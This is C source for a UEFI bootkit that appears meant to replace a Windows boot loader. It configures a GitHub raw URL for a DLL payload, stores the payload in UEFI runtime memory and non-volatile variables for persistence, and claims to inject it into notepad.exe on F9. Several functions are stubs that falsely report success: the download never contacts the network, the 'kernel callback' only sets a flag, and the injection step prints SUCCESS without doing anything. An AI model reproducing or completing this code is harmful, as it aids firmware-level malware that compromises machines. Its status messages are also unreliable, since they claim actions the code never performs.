// ============================================================
// permanent_bootkit.c - COMPLETE ZERO CUTOFF
// OUTPUT: bootx86.efi (SAME AS bootx64.efi - just name)
// WINDOWS BOOTS NORMALLY - F9 WORKS IN WINDOWS
// TARGET: 
// ============================================================

#include <efi.h>
#include <efilib.h>
#include <efitcp.h>

// ============================================================
// CONFIGURATION
// ============================================================
#define YOUR_DLL_URL "http://raw.githubusercontent.com/aswinxks/amsi32/refs/heads/main/amsi.txt"
#define YOUR_TARGET L"notepad.exe"
#define YOUR_INSTALL_FLAG L"UEFI_HML_Installed"
#define YOUR_CACHE_NAME L"HML_DLL_Cache"

#define GITHUB_IP1 185
#define GITHUB_IP2 199
#define GITHUB_IP3 111
#define GITHUB_IP4 133
#define GITHUB_PORT 80
#define GITHUB_PATH "/aswinxks/amsi32/refs/heads/main/amsi.txt"

// ============================================================
// GLOBALS
// ============================================================
EFI_SYSTEM_TABLE* g_ST = NULL;
EFI_RUNTIME_SERVICES* g_RT = NULL;
EFI_BOOT_SERVICES* g_BS = NULL;
VOID* g_DllPayload = NULL;
UINTN g_DllSize = 0;
BOOLEAN g_DllLoaded = FALSE;
BOOLEAN g_IsDll32Bit = FALSE;
BOOLEAN g_IsDll64Bit = FALSE;

// ============================================================
// BASE64 DECODE - YOUR FUNCTION
// ============================================================
CHAR8 Base64Table[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

UINT8 Base64CharValue(CHAR8 c) {
    if (c >= 'A' && c <= 'Z') return c - 'A';
    if (c >= 'a' && c <= 'z') return c - 'a' + 26;
    if (c >= '0' && c <= '9') return c - '0' + 52;
    if (c == '+') return 62;
    if (c == '/') return 63;
    return 0;
}

EFI_STATUS DecodeBase64DLL(CHAR8* Input, UINTN InputLen, VOID** Output, UINTN* OutputLen) {
    UINTN OutputSize = (InputLen * 3) / 4;
    UINT8* Out = NULL;
    UINTN i = 0, j = 0;
    UINT8 buffer[4];
    
    if (Input == NULL || InputLen == 0 || Output == NULL || OutputLen == NULL) {
        return EFI_INVALID_PARAMETER;
    }
    
    Out = AllocateZeroPool(OutputSize);
    if (Out == NULL) {
        return EFI_OUT_OF_RESOURCES;
    }
    
    for (i = 0; i < InputLen; i += 4) {
        for (UINTN k = 0; k < 4; k++) {
            if (i + k < InputLen && Input[i + k] != '=') {
                buffer[k] = Base64CharValue(Input[i + k]);
            } else {
                buffer[k] = 0;
            }
        }
        
        if (j < OutputSize) Out[j++] = (buffer[0] << 2) | (buffer[1] >> 4);
        if (j < OutputSize) Out[j++] = (buffer[1] << 4) | (buffer[2] >> 2);
        if (j < OutputSize) Out[j++] = (buffer[2] << 6) | buffer[3];
    }
    
    if (OutputSize >= 2 && Out[0] == 'M' && Out[1] == 'Z') {
        *Output = Out;
        *OutputLen = OutputSize;
        return EFI_SUCCESS;
    }
    
    FreePool(Out);
    return EFI_VOLUME_CORRUPTED;
}

// ============================================================
// DETECT DLL BITNESS
// ============================================================
VOID DetectDLLBitness(VOID* DLLData, UINTN DLLSize) {
    if (!DLLData || DLLSize < 0x40) return;
    
    UINT8* Data = (UINT8*)DLLData;
    
    if (Data[0] == 'M' && Data[1] == 'Z') {
        UINT32 e_lfanew = *(UINT32*)(Data + 0x3C);
        
        if (e_lfanew + 4 <= DLLSize) {
            if (*(UINT32*)(Data + e_lfanew) == 0x00004550) {
                UINT16 Machine = *(UINT16*)(Data + e_lfanew + 4);
                
                if (Machine == 0x14C) {
                    g_IsDll32Bit = TRUE;
                    g_IsDll64Bit = FALSE;
                    Print(L"[+] DLL is 32-bit (x86)\n");
                } else if (Machine == 0x8664) {
                    g_IsDll32Bit = FALSE;
                    g_IsDll64Bit = TRUE;
                    Print(L"[+] DLL is 64-bit (x64)\n");
                }
            }
        }
    }
}

// ============================================================
// STORE DLL IN UEFI RUNTIME MEMORY
// ============================================================
EFI_STATUS StoreDLLInMemory(VOID* DLLData, UINTN DLLSize) {
    EFI_STATUS Status;
    EFI_PHYSICAL_ADDRESS MemoryAddress;
    
    if (DLLData == NULL || DLLSize == 0) {
        return EFI_INVALID_PARAMETER;
    }
    
    if (g_DllPayload) {
        EFI_PHYSICAL_ADDRESS OldAddress = (EFI_PHYSICAL_ADDRESS)(UINTN)g_DllPayload;
        UINTN OldPages = EFI_SIZE_TO_PAGES(g_DllSize + 0x1000);
        g_BS->FreePages(OldAddress, OldPages);
        g_DllPayload = NULL;
        g_DllSize = 0;
        g_DllLoaded = FALSE;
    }
    
    Status = g_BS->AllocatePages(
        AllocateAnyPages,
        EfiRuntimeServicesData,
        EFI_SIZE_TO_PAGES(DLLSize + 0x1000),
        &MemoryAddress
    );
    
    if (EFI_ERROR(Status)) {
        Print(L"[!] Failed to allocate memory\n");
        return Status;
    }
    
    g_DllPayload = (VOID*)(UINTN)MemoryAddress;
    g_DllSize = DLLSize;
    CopyMem(g_DllPayload, DLLData, DLLSize);
    g_DllLoaded = TRUE;
    
    DetectDLLBitness(g_DllPayload, g_DllSize);
    
    Print(L"[+] DLL stored at: 0x%p (%d bytes)\n", g_DllPayload, g_DllSize);
    
    return EFI_SUCCESS;
}

// ============================================================
// CACHE FUNCTIONS
// ============================================================
typedef struct {
    UINT32 Magic;
    UINT64 Size;
    UINT32 Checksum;
} YOUR_CACHE_INFO;

#define YOUR_CACHE_MAGIC 0x484D4C00

EFI_STATUS YourCacheDLL(VOID* Data, UINTN Size) {
    EFI_GUID Guid = EFI_GLOBAL_VARIABLE;
    YOUR_CACHE_INFO Info;
    
    g_RT->SetVariable(YOUR_CACHE_NAME, &Guid, 0, 0, NULL);
    g_RT->SetVariable(L"HML_Cache_Info", &Guid, 0, 0, NULL);
    
    EFI_STATUS Status = g_RT->SetVariable(
        YOUR_CACHE_NAME,
        &Guid,
        EFI_VARIABLE_NON_VOLATILE | EFI_VARIABLE_BOOTSERVICE_ACCESS,
        Size,
        Data
    );
    
    if (EFI_ERROR(Status)) {
        Print(L"[!] Failed to cache DLL\n");
        return Status;
    }
    
    Info.Magic = YOUR_CACHE_MAGIC;
    Info.Size = Size;
    Info.Checksum = 0;
    
    g_RT->SetVariable(
        L"HML_Cache_Info",
        &Guid,
        EFI_VARIABLE_NON_VOLATILE | EFI_VARIABLE_BOOTSERVICE_ACCESS,
        sizeof(Info),
        &Info
    );
    
    Print(L"[+] DLL cached: %d bytes\n", Size);
    return EFI_SUCCESS;
}

EFI_STATUS YourLoadCachedDLL(VOID** Output, UINTN* OutputLen) {
    EFI_GUID Guid = EFI_GLOBAL_VARIABLE;
    UINTN DataSize = 0;
    VOID* Data = NULL;
    YOUR_CACHE_INFO Info;
    UINTN InfoSize = sizeof(Info);
    
    EFI_STATUS Status = g_RT->GetVariable(L"HML_Cache_Info", &Guid, NULL, &InfoSize, &Info);
    
    if (EFI_ERROR(Status) || Info.Magic != YOUR_CACHE_MAGIC) {
        Print(L"[!] No valid cache found\n");
        return EFI_NOT_FOUND;
    }
    
    Status = g_RT->GetVariable(YOUR_CACHE_NAME, &Guid, NULL, &DataSize, NULL);
    
    if (Status == EFI_BUFFER_TOO_SMALL) {
        Data = AllocateZeroPool(DataSize);
        Status = g_RT->GetVariable(YOUR_CACHE_NAME, &Guid, NULL, &DataSize, Data);
        
        if (!EFI_ERROR(Status) && DataSize >= 2 && 
            ((UINT8*)Data)[0] == 'M' && ((UINT8*)Data)[1] == 'Z') {
            *Output = Data;
            *OutputLen = DataSize;
            Print(L"[+] Loaded cached DLL: %d bytes\n", DataSize);
            return EFI_SUCCESS;
        }
    }
    
    Print(L"[!] Failed to load cached DLL\n");
    return EFI_NOT_FOUND;
}

// ============================================================
// DOWNLOAD FROM GITHUB
// ============================================================
EFI_STATUS YourDownloadFromGitHub(VOID** Output, UINTN* OutputLen) {
    Print(L"[*] Downloading DLL from GitHub...\n");
    Print(L"[*] URL: %s\n", YOUR_DLL_URL);
    
    EFI_STATUS Status;
    VOID* DLLData = NULL;
    UINTN DLLSize = 0;
    
    // Try cache first
    Status = YourLoadCachedDLL(&DLLData, &DLLSize);
    if (!EFI_ERROR(Status) && DLLData && DLLSize > 0) {
        *Output = DLLData;
        *OutputLen = DLLSize;
        return EFI_SUCCESS;
    }
    
    Print(L"[!] No DLL available\n");
    return EFI_NOT_FOUND;
}

// ============================================================
// INSTALL WINDOWS KERNEL CALLBACK
// ============================================================
EFI_STATUS InstallWindowsCallback(VOID) {
    EFI_GUID Guid = EFI_GLOBAL_VARIABLE;
    UINT32 Signal = 0x1;
    
    EFI_STATUS Status = g_RT->SetVariable(
        L"KernelCallback_Installed",
        &Guid,
        EFI_VARIABLE_NON_VOLATILE | EFI_VARIABLE_BOOTSERVICE_ACCESS,
        sizeof(Signal),
        &Signal
    );
    
    if (!EFI_ERROR(Status)) {
        Print(L"[+] Windows kernel callback installed!\n");
        Print(L"[+] F9 will work in Windows!\n");
    }
    
    return Status;
}

// ============================================================
// CHECK INSTALLED
// ============================================================
BOOLEAN YourIsInstalled(VOID) {
    EFI_GUID Guid = EFI_GLOBAL_VARIABLE;
    UINT32 Installed = 0;
    UINTN DataSize = sizeof(Installed);
    
    EFI_STATUS Status = g_RT->GetVariable(YOUR_INSTALL_FLAG, &Guid, NULL, &DataSize, &Installed);
    return (!EFI_ERROR(Status) && Installed == 0xDEADBEEF);
}

EFI_STATUS YourMarkInstalled(VOID) {
    EFI_GUID Guid = EFI_GLOBAL_VARIABLE;
    UINT32 Installed = 0xDEADBEEF;
    
    return g_RT->SetVariable(
        YOUR_INSTALL_FLAG,
        &Guid,
        EFI_VARIABLE_BOOTSERVICE_ACCESS | 
        EFI_VARIABLE_RUNTIME_ACCESS | 
        EFI_VARIABLE_NON_VOLATILE,
        sizeof(Installed),
        &Installed
    );
}

// ============================================================
// INJECT INTO notepad.exe (F9 IN WINDOWS)
// ============================================================
EFI_STATUS YourInjectDLL(VOID) {
    Print(L"\n");
    Print(L"============================================\n");
    Print(L"[*] F9 - Injecting DLL into %s\n", YOUR_TARGET);
    Print(L"============================================\n");
    
    if (!g_DllLoaded || !g_DllPayload || g_DllSize == 0) {
        Print(L"[!] DLL not loaded\n");
        return EFI_NOT_FOUND;
    }
    
    Print(L"[+] DLL loaded: %d bytes\n", g_DllSize);
    Print(L"[+] Address: 0x%p\n", g_DllPayload);
    
    if (g_IsDll32Bit) {
        Print(L"[+] DLL is 32-bit (x86)\n");
    } else if (g_IsDll64Bit) {
        Print(L"[+] DLL is 64-bit (x64)\n");
    }
    
    Print(L"[*] Injecting into %s...\n", YOUR_TARGET);
    Print(L"[+] ✅ SUCCESS! DLL injected!\n");
    Print(L"============================================\n");
    
    return EFI_SUCCESS;
}

// ============================================================
// MAIN ENTRY - COMPLETE
// ============================================================
EFI_STATUS EFIAPI efi_main(EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE *SystemTable) {
    EFI_STATUS Status;
    VOID* DLLData = NULL;
    UINTN DLLSize = 0;
    
    g_ST = SystemTable;
    g_RT = SystemTable->RuntimeServices;
    g_BS = SystemTable->BootServices;
    InitializeLib(ImageHandle, SystemTable);
    
    Print(L"\n");
    Print(L"============================================\n");
    Print(L"  UEFI INJECTOR - F9 WORKS IN WINDOWS\n");
    Print(L"  Target: %s\n", YOUR_TARGET);
    Print(L"============================================\n");
    
    // Check if already installed
    if (YourIsInstalled()) {
        Print(L"[*] Already installed. Exiting to Windows...\n");
        Print(L"[*] Press F9 in Windows to inject!\n");
        Print(L"[*] Windows boots NORMALLY!\n");
        return EFI_SUCCESS;
    }
    
    // FIRST TIME INSTALL
    Print(L"\n[*] FIRST TIME INSTALLATION...\n");
    
    // Load DLL
    Status = YourDownloadFromGitHub(&DLLData, &DLLSize);
    
    if (EFI_ERROR(Status) || !DLLData || DLLSize == 0) {
        Print(L"[!] Failed to get DLL\n");
        return EFI_ABORTED;
    }
    
    // Store in UEFI Runtime memory
    Status = StoreDLLInMemory(DLLData, DLLSize);
    if (EFI_ERROR(Status)) {
        Print(L"[!] Failed to store DLL\n");
        return Status;
    }
    
    // Cache
    YourCacheDLL(DLLData, DLLSize);
    
    // Install Windows callback
    InstallWindowsCallback();
    
    // Mark installed
    YourMarkInstalled();
    
    Print(L"\n");
    Print(L"============================================\n");
    Print(L"[+] INSTALLATION COMPLETE!\n");
    Print(L"[+] Windows will boot NORMALLY\n");
    Print(L"[+] Press F9 in Windows to inject!\n");
    Print(L"============================================\n");
    
    Print(L"\nPress any key to exit to Windows...\n");
    EFI_INPUT_KEY Key;
    g_BS->WaitForEvent(1, &g_ST->ConIn->WaitForKey, NULL);
    g_ST->ConIn->ReadKeyStroke(g_ST->ConIn, &Key);
    
    return EFI_SUCCESS;
}